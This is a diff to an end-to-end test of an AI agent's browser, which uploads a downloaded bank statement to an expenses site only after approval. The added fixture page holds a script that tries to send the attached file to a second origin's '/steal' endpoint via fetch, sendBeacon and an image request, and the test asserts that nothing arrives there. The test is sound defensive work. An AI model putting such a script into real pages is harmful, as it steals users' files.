@@ -241,6 +241,8 @@ test("a file the browser downloads in one chat is read by another chat's next tu
   try {
     // A bank with a statement to download, and an expenses site that takes one.
     const received: string[] = []
+    const stolen: string[] = []
+    let otherSiteUrl = ""
     const site: Server = createServer((request, response) => {
       if (request.method === "POST" && request.url === "/expenses") {
         let body = ""
@@ -251,12 +253,18 @@ test("a file the browser downloads in one chat is read by another chat's next tu
         })
         return
       }
+      if (request.url?.startsWith("/steal")) {
+        stolen.push(request.method ?? "")
+        response.writeHead(200).end("ok")
+        return
+      }
       if (request.url === "/statement.csv") {
         response.writeHead(200, { "content-type": "text/csv", "content-disposition": 'attachment; filename="october-statement.csv"' }).end(STATEMENT)
         return
       }
       const page = request.url === "/expenses"
-        ? '<!doctype html><title>Expenses</title><form method="post" action="/expenses" enctype="multipart/form-data"><label>Statement <input type="file" name="statement"></label><button>Send</button></form>'
+        ? // A script on the page tries to pass the file to another site as soon as it is attached.
+          `<!doctype html><title>Expenses</title><form method="post" action="/expenses" enctype="multipart/form-data"><label>Statement <input type="file" name="statement"></label><button>Send</button></form><script>document.querySelector("input").addEventListener("change", (event) => { for (const send of [() => fetch("${otherSiteUrl}/steal", { method: "POST", body: event.target.files[0], mode: "no-cors" }), () => navigator.sendBeacon("${otherSiteUrl}/steal", event.target.files[0]), () => { new Image().src = "${otherSiteUrl}/steal?" + event.target.files[0].name } ]) try { send() } catch {} })</script>`
         : '<!doctype html><title>Bank</title><a href="/statement.csv">Download statement</a>'
       response.writeHead(200, { "content-type": "text/html" }).end(page)
     })
@@ -265,6 +273,8 @@ test("a file the browser downloads in one chat is read by another chat's next tu
     const siteAddress = site.address()
     assert.ok(siteAddress && typeof siteAddress === "object")
     const siteUrl = `http://127.0.0.1:${siteAddress.port}`
+    // The same server under another site's name (localhost is a different site from 127.0.0.1).
+    otherSiteUrl = `http://localhost:${siteAddress.port}`
 
     // Chrome, and one cloud browser per computer (as each desktop runs its own), its Downloads in that computer's /files.
     assert.ok(chrome, "Chrome is required")
@@ -365,6 +375,7 @@ test("a file the browser downloads in one chat is read by another chat's next tu
     const approved = await turn("hs_e2e_chat_expenses", "msg_approved", "Approved: upload october-statement.csv to the expenses site")
     assert.match(approved[3] ?? "", /"type":"upload","ref":"e1","outcome":"attached","files":1/)
     assert.equal(received.length, 1)
+    assert.deepEqual(stolen, [], "while the tab holds the file it reaches only the approved site")
     assert.ok(received[0]?.includes('filename="october-statement.csv"') && received[0].includes("2026-10-01,Coffee beans,18.50"), "the site received the file from My files")
     console.log(`✓ another chat read ${expenses[0]?.split("\n").length} lines; its upload waited for approval, then the browser uploaded october-statement.csv (${received[0]?.length} bytes posted)`)
 
